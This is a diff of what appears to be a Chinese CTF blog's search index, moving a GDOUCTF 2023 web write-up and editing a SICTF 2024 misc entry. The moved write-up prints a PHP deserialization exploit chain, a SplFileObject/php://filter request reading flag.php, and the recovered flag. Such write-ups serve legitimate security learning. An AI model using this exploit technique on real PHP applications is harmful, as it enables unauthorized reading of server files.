@@ -43,36 +43,6 @@
       </tags>
   </entry>
   <entry>
-    <title>[GDOUCTF 2023]反方向的钟</title>
-    <url>/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
-    <content><![CDATA[<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><p>题目链接<a href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
-<span id="more"></span>
-<p>拿到题目，先代码审计</p>
-<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="图片1">​</p>
-<p>看了一下是反序列化攻击</p>
-<p>直接分析代码，满足</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>
-
-<p>语句</p>
-<p>执行原生类，然后利用wakeup触发函数，到这里执行，直接贴exp</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>然后传入原生类</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
-
-<p>这里已经给出flag位置，SplFileObject只能读取单行，所以用伪协议读取全文，解密拿到flag</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>
-
-<p>$flag &#x3D; “NSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}”;</p>
-]]></content>
-      <categories>
-        <category>日常writeup</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>SICTF 2024</title>
     <url>/2024/11/06/SICTF-2024-round4/</url>
     <content><![CDATA[<h1 id="SICTF-2024-Round-4"><a href="#SICTF-2024-Round-4" class="headerlink" title="SICTF 2024 #Round 4"></a><strong>SICTF 2024 #Round 4</strong></h1><p><img src="/2024/11/06/SICTF-2024-round4/1.jpg" alt="图片"></p>
@@ -118,7 +88,7 @@
 <p>直接用在线网站看到</p>
 <p><a href="https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681">https://fotoforensics.com/analysis.php?id=05826ce23b2159d5bff498a7756bba511d45b1d2.202681</a></p>
 <p><img src="/2024/11/06/SICTF-2024-round4/5.jpg" alt="img"></p>
-<p>这里是伪随机数，写出解密脚本：</p>
+<p>获得随机数种子，这里是伪随机数，写出解密脚本：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">496534891</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_file_as_bytes</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_data = f.read()</span><br><span class="line">        decrypted_data = <span class="built_in">bytes</span>((byte ^ random.randint(<span class="number">10</span>, <span class="number">20</span>) <span class="keyword">for</span> byte <span class="keyword">in</span> file_data))</span><br><span class="line">        <span class="keyword">return</span> decrypted_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_bytes_to_file</span>(<span class="params">bytes_data, output_file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(bytes_data)</span><br><span class="line">enc = decrypt_file_as_bytes(<span class="string">&quot;data&quot;</span>) </span><br><span class="line">write_bytes_to_file(enc, <span class="string">&quot;decrypted_deepsea.wav&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>拿到deepsea.wav，用deepsound打开，获得一个sea.wav文件，SSTV扫描，拿到压缩包key</p>
@@ -202,6 +172,36 @@
       <tags>
         <tag>misc</tag>
         <tag>crypto</tag>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>[GDOUCTF 2023]反方向的钟</title>
+    <url>/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/</url>
+    <content><![CDATA[<h1 id="GDOUCTF-2023-反方向的钟"><a href="#GDOUCTF-2023-反方向的钟" class="headerlink" title="[GDOUCTF 2023]反方向的钟"></a>[GDOUCTF 2023]反方向的钟</h1><p>题目链接<a href="https://www.nssctf.cn/problem/3723">https://www.nssctf.cn/problem/3723</a></p>
+<span id="more"></span>
+<p>拿到题目，先代码审计</p>
+<p><img src="/2024/11/05/GDOUCTF-2023-%E5%8F%8D%E6%96%B9%E5%90%91%E7%9A%84%E9%92%9F/1.png" alt="图片1">​</p>
+<p>看了一下是反序列化攻击</p>
+<p>直接分析代码，满足</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;headmaster == <span class="string">&#x27;ong&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>语句</p>
+<p>执行原生类，然后利用wakeup触发函数，到这里执行，直接贴exp</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">teacher</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$rank</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$salary</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">classroom</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;one class&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$leader</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">school</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$department</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$headmaster</span>=<span class="string">&#x27;ong&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">teacher</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;name=<span class="string">&#x27;ing&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p1</span>-&gt;rank=<span class="string">&#x27;department&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">classroom</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p2</span>-&gt;leader = <span class="variable">$p1</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>= <span class="keyword">new</span> <span class="title function_ invoke__">school</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$p3</span>-&gt;department = <span class="variable">$p2</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$p3</span>)));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后传入原生类</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=<span class="built_in">SplFileObject</span>&amp;b=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>这里已经给出flag位置，SplFileObject只能读取单行，所以用伪协议读取全文，解密拿到flag</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHANCiRmbGFnID0gIk5TU0NURnszMjVjODZhNS01M2VjLTRkMzctYTU4OC02MWRiOTVjYzg1NGR9IjsNCj8+DQo=</span><br></pre></td></tr></table></figure>
+
+<p>$flag &#x3D; “NSSCTF{325c86a5-53ec-4d37-a588-61db95cc854d}”;</p>
+]]></content>
+      <categories>
+        <category>日常writeup</category>
+      </categories>
+      <tags>
         <tag>web</tag>
       </tags>
   </entry>
